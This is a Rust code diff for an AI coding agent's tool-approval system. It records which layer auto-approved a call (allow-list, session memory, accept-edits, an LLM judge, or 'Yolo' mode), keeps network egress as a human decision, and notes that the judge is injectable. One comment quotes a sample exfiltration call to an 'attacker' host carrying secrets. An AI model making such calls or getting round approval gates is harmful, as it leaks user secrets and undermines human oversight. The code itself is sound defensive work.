@@ -14,7 +14,9 @@ use crate::runtime::AgentRuntime;
 use crate::runtime::event::{RuntimeEvent, ToolCallId, TurnId, emit};
 use crate::runtime::state::PendingToolBatch;
 use crate::runtime::tool_result::BatchOutcome;
-use crate::tool::{ApprovalDecision, ApprovalRequest, ToolCall, ToolResult, ToolRunOutcome};
+use crate::tool::{
+    ApprovalDecision, ApprovalRequest, RunAuthority, ToolCall, ToolResult, ToolRunOutcome,
+};
 
 /// Whether "approve for the whole session" may be recorded for a tool.
 /// Shell-class tools are excluded: their risk lives in the per-call
@@ -120,20 +122,62 @@ pub(super) fn shell_consent_key(call: &ToolCall) -> Option<(String, bool)> {
     Some((identity, network_requested(&call.arguments)))
 }
 
+/// The layer that resolved a gated call without a human (see
+/// [`AgentRuntime::auto_approval_granted`]), kept apart because two of them
+/// *parsed* the command and the rest only recognised a name or a mode: the
+/// executor runs a parsed command as that parse's argv, with no shell in
+/// between, and everything else as the text a human would have read.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(super) enum AutoApproval {
+    /// Config `auto_allow` names the tool.
+    ConfigAllowList,
+    /// A session "a" on this tool name (never `shell`/`job`, see
+    /// [`session_allowable`]).
+    SessionTool,
+    /// A session "a" remembered this command's identity (`command_shape`).
+    SessionShell,
+    /// The accept-edits allowance read the command as a bounded fs edit.
+    AcceptEdits,
+    /// The Auto-mode Flash judge approved the call.
+    Judge,
+    /// Yolo approves everything that reaches the gate.
+    Yolo,
+}
+
+impl AutoApproval {
+    /// Whether the executor may hand the command to a shell (`Approved`) or
+    /// must run the policy's own argv (`Parse`).
+    pub(super) fn authority(self) -> RunAuthority {
+        match self {
+            Self::SessionShell | Self::AcceptEdits => RunAuthority::Parse,
+            Self::ConfigAllowList | Self::SessionTool | Self::Judge | Self::Yolo => {
+                RunAuthority::Approved
+            }
+        }
+    }
+}
+
 impl AgentRuntime {
-    /// Whether a gated call may run without asking. Two independent layers:
+    /// Whether a gated call may run without asking, and on whose authority.
+    /// Two independent layers:
     /// (1) standing consent — a configured `auto_allow` name or a session
     /// "a" — is mode-independent; (2) the session [`PermissionMode`] relaxes
     /// the gate more broadly. Policy hard-denials are unaffected either way:
     /// they short-circuit in the registry before any decision is consulted.
     /// (That covers commands the deny parser recognized — it is best-effort,
     /// so `Yolo`'s real containment is the OS sandbox, not the deny list.)
+    ///
+    /// `None` means ask. `Some` names the layer that resolved it, because the
+    /// executor needs to know whether that layer *parsed* the command (a
+    /// remembered shell identity, the accept-edits allowance) or merely waved
+    /// the text through (a tool name, the judge, Yolo) — see
+    /// [`AutoApproval::authority`].
     pub(super) async fn auto_approval_granted(
         &self,
         call: &ToolCall,
         request: &ApprovalRequest,
         cancel: &CancellationToken,
-    ) -> bool {
+    ) -> Option<AutoApproval> {
         // Widening the write boundary is a human decision in EVERY mode and
         // through EVERY consent channel: above Layer 1 so a config
         // `auto_allow` entry cannot become a standing root-grant (grants
@@ -141,7 +185,7 @@ impl AgentRuntime {
         // even Yolo prompts — Yolo's real containment is the OS sandbox, and
         // this call is precisely a request to widen that containment.
         if is_root_grant(&call.name) {
-            return false;
+            return None;
         }
         // Layer 1: standing consent (config auto_allow + session memory).
         // Exact name match, not a prefix: standing consent must not stretch.
@@ -149,12 +193,12 @@ impl AgentRuntime {
         // added later whose name happens to extend a consented entry would
         // have shipped pre-approved without anyone deciding that.
         if self.config.approval_auto_allow.contains(&call.name) {
-            return true;
+            return Some(AutoApproval::ConfigAllowList);
         }
         let user_task = {
             let state = self.state.lock().await;
             if state.session_approved.contains(&call.name) {
-                return true;
+                return Some(AutoApproval::SessionTool);
             }
             // Shell isn't blanket session-approvable by name; trust at command
             // granularity instead ("a" remembered `cargo test`, `git push`, …),
@@ -162,15 +206,16 @@ impl AgentRuntime {
             if let Some(key) = shell_consent_key(call)
                 && state.session_trusted_shell_prefixes.contains(&key)
             {
-                return true;
+                return Some(AutoApproval::SessionShell);
             }
             state.current_prompt.clone().unwrap_or_default()
         }; // release the state lock before any mode logic (Auto awaits a judge)
 
         // Layer 2: session permission mode.
         match self.permission_mode() {
-            PermissionMode::Default => false,
-            PermissionMode::AcceptEdits => accept_edits_approvable(&call.name, &call.arguments),
+            PermissionMode::Default => None,
+            PermissionMode::AcceptEdits => accept_edits_approvable(&call.name, &call.arguments)
+                .then_some(AutoApproval::AcceptEdits),
             PermissionMode::Auto => {
                 // Egress sits above the judge: opening the network is the
                 // human's call, never something a classifier waves through.
@@ -185,13 +230,13 @@ impl AgentRuntime {
                 // `fetch_url http://attacker/exfil?d=<secrets>` was decided by
                 // the Flash judge, a soft and injectable backstop, in Auto mode.
                 // Short-circuits before the judge spends a request.
-                !request.network
-                    && !is_network_tool(&call.name)
-                    && self
-                        .auto_mode_approves(call, request, &user_task, cancel)
-                        .await
+                if request.network || is_network_tool(&call.name) {
+                    return None;
+                }
+                self.auto_mode_approves(call, request, &user_task, cancel)
+                    .await
             }
-            PermissionMode::Yolo => true,
+            PermissionMode::Yolo => Some(AutoApproval::Yolo),
         }
     }
 
@@ -200,27 +245,28 @@ impl AgentRuntime {
     /// unless the AcceptEdits allowance inherited just below already covers it),
     /// the offline echo backend can't judge, and a cancel mid-flight aborts into
     /// "ask". Everything else the classifier decides, failing safe to a prompt.
-    /// The judge's token usage is billed to the session.
+    /// The judge's token usage is billed to the session. Returns which
+    /// allowance decided — the inherited accept-edits parse, or the judge.
     async fn auto_mode_approves(
         &self,
         call: &ToolCall,
         request: &ApprovalRequest,
         user_task: &str,
         cancel: &CancellationToken,
-    ) -> bool {
+    ) -> Option<AutoApproval> {
         // Auto is at least as permissive as AcceptEdits (it sits above it in the
         // mode cycle), so inherit its bounded fs-edit allowances first. Without
         // this, a "more permissive" mode would ask for a plain `mkdir src/x`
         // that the stricter AcceptEdits waves through — shell defaults to the
         // High risk tier, which the judge floor below always prompts on.
         if accept_edits_approvable(&call.name, &call.arguments) {
-            return true;
+            return Some(AutoApproval::AcceptEdits);
         }
         if request.risk_level == RiskLevel::High {
-            return false;
+            return None;
         }
         if self.client.provider_name() == crate::echo_client::EchoClient::PROVIDER {
-            return false;
+            return None;
         }
         let action = crate::approval_classifier::action_summary(&call.name, &call.arguments);
         let input = crate::approval_classifier::ClassifierInput {
@@ -235,13 +281,13 @@ impl AgentRuntime {
         // reply aborts the call into "ask" instead of blocking the turn.
         let (approved, usage) = tokio::select! {
             biased;
-            () = cancel.cancelled() => return false,
+            () = cancel.cancelled() => return None,
             verdict = crate::approval_classifier::approves(&*self.client, &model, &input) => verdict,
         };
         if let Some(usage) = usage {
             self.record_classifier_cost(&model, &usage).await;
         }
-        approved
+        approved.then_some(AutoApproval::Judge)
     }
 
     /// The model the auto-mode classifier runs on (see [`classifier_model_for`]).
@@ -358,7 +404,14 @@ impl AgentRuntime {
             return;
         }
         match self
-            .run_tool(&current, Some(decision), &cancel, &turn_id, tx)
+            .run_tool(
+                &current,
+                Some(decision),
+                RunAuthority::Approved,
+                &cancel,
+                &turn_id,
+                tx,
+            )
             .await
         {
             Ok(ToolRunOutcome::Result { mut result }) => {
